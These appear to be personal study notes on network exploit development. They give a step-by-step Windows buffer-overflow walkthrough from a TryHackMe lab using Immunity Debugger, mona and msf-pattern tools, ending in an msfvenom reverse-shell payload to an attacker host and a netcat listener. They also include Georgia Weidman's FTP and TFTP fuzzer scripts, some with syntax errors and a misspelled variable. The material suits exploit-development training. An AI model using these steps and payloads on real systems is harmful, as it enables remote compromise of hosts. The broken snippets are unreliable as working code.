Network Exploit Development

[*] Tools - Windows Debugging
	Wingdb
	Windebug
        Immunity Debugger
		https://github.com/corelan/mona
			Obtain mona.py and install the python script into Immunity Debugger.
		https://www.python.org/downloads/release/python-2718/
			Download and install python 2.7 32 bit version (x86), otherwise mona.py will fail.
                ***Example from TryHackMe Buffer Overflow Prep room.***
                Set Mona working directory
                        !mona config -set workingfolder c:\mona\%p
                Execute the fuzzer.py script
                        ./fuzzer.py
                                Dies on 700 bytes, bump this up by 400 for playing room
                Create your offset payload and update the exploit.py script payload variable.
                        msf-pattern_create -l 1100
                                copy this output and put this in the "payload" variable, in exploit.py script.
                                Run the exploit script after restarting oscp script in mona
                After run, grab the offset instruction EIP, we need to see the offset in kali and in mona
                        msf-pattern_offset -l 1100 -q 76413176
                        !mona findmsp -distance 1100
                                Look at  the EIP in the Log window, notice they both come out to 634 offset.
                Update the exploit.py script with 634 offset, BBBB retn. Run the exploit script again after restarting mona.
                Notice the EIP is at 42424242, we successfully returned on BBBB.
			You may need to adjust up or down to land on your BBBB retn. Use the "msf" command to alter your payload.
				msf-pattern_create -l 1000
                Take note of ESP, we need this. We will now go looking for bad characters to avoid shell code changes.
                Run in mona to start creating a bytearray, we will remove bad chars.
                        !mona bytearray -b "\x00"
                Run this for-loop and save the output as our new payload in exploit.py
                        for x in range(1, 256):
                            print("\\x" + "{:02x}".format(x), end='')
                        print()
                        Notice we have remove "\x00" - this is a default bad char and it needs to go.
                Restart mona and run the exploit.py script
                Right click on ESP to follow the dump, should notice the bad character. If not, don't stress.
                Now run the following, replace the last value with your ESP value
                        !mona compare -f C:\mona\oscp\bytearray.bin -a 01A7FA30
                Cool, you should now see a list of bad characters. Not all are bad though, so start by removing the first bad character.
                Remember to remove the bad next bad character from mona AND your exploit.py payload
                        !mona bytearray -b "\x00\x23"
                        vi exploit.py -> remove \x23 from the payload variable
                Alright, restart mona and run the exploit.py script. This is going to continue until all bad chars are removed.
                        !mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30
                        !mona bytearray -b "\x00\x23\x3c"
                        vi exploit.py -> remove \x3c from the payload variable
                        !mona compare -f C:\mona\oscp\bytearray.bin -a 01B7FA30
                        !mona bytearray -b "\x00\x23\x3c\x83"
                        vi exploit.py -> remove \x83 from the payload variable
                        !mona compare -f C:\mona\oscp\bytearray.bin -a 0195FA30
                        !mona bytearray -b "\x00\x23\x3c\x83\xba"
                        vi exploit.py -> remove \xba from the payload variable
                        !mona compare -f C:\mona\oscp\bytearray.bin -a 018EFA30
                                Finally! Shellcode is unmodified! We have our valid chars for shellcode
                Now we need to find our jmp esp instruction, this will give us the next instruction that we want to overwrite with shellcode
                        !mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
                Looking at the Log window, we can see a few addresses we may use to overwrite, examples:
                        0x625011af
                        0x625011bb
                        0x625011c7
                Update the following variables in our exploit.py file. Remember little-endian, we need to write the address backwards.
                We will also add padding. It is common to have a buffer of 8-16 bytes of blank space, \x90 is our No Operation (Nop).
                        retn = "\xaf\x11\x50\x62"
                        padding = "\x90" * 16
                Create shellcode however your want, this example we will use msfvenom since this will help us avoid bad chars.
                        msfvenom -p windows/shell_reverse_tcp LHOST=10.2.10.10 LPORT=80 EXITFUNC=thread -b “\x00\x23\x3c\x83\xba” -f c
                Use the generated shellcode and drop it into the exploit.py script
                Once this is in the exploit.py script, start a netcat listener on the correct port (80), restart mona, and exec exploit.py
                        Attacker machine: sudo rlwrap nc -lvnp 80
                        Attacker machine: ./exploit.py
                                Shell popped!
		Helpful Links:		
			https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
			/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
				-l <length of characters for gdb testing>
			/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
				-q <memory address where we seg faulted>
	checksec
		checksec <program>
	gdb
		gdb <program>
		disassemble <function like "main">
		r #  To run the program, arguments work as well
	readelf
		readelf -l <program>
			displays information about elf files
	ldd
		ldd <program>
			This will give you sharable dependencies during program

[*] Tools - Linux 
	man ascii
		Check HEX value for alphabet conversion.
	ascii
		└─$ ascii 0x41
		ASCII 4/1 is decimal 065, hex 41, octal 101, bits 01000001: prints as `A'
		Official name: Majuscule A
		Other names: Capital A, Uppercase A
	msf_pattern_offset <400 bytes more than crash> <EIP Address>
		msf_pattern_offset -l 2400 -q 6F43396E
	ANOTHER WAY - Use Mona if you are using Immunity Debugger (Windows)
		!mona findmsp -distance 2400
	

	Georgia Weidman script - warftpskel.py

		#!/usr/bin/env python
		
		import socket
		
		
		buffer = "A" * 1100
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect(('192.168.1.50', 21))
		response = s.recv(1024)
		print(response)
		
		s.send('USER ' + buffer '\r\n')
		response = s.recv(1024)
		print(response)
		
		s.send('PASS PASSWORD\r\n')
		s.close()

	Georgia Weidman script - 3comfuzzer.py

		#!/usr/bin/env python
		import socket
		buffer_array = ["A" * 100]
		addition = 200
		
		while len(buffer_array) <= 50:
		    buffer_array.append("A" * addition)
		    addition += 100
		
		for value in buffer_array:
		    tftp_packet = "\x00\x02" + "Georgia" | "\x00" + value + "\x00"
		    print "Fuzzing with length " + str(len(value))
		    print tftp_packet
		    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		    s.sendto(tfpt_packet, ('10.0.0.37', 69))
		    response = s.recvfrom(2048)
		    print response


[*] Metasploit Module
	After creating a metasploit module, use msftidy to clean up your exploit:
		/usr/share/metasploit-framework/tools/dev/msftidy.rb
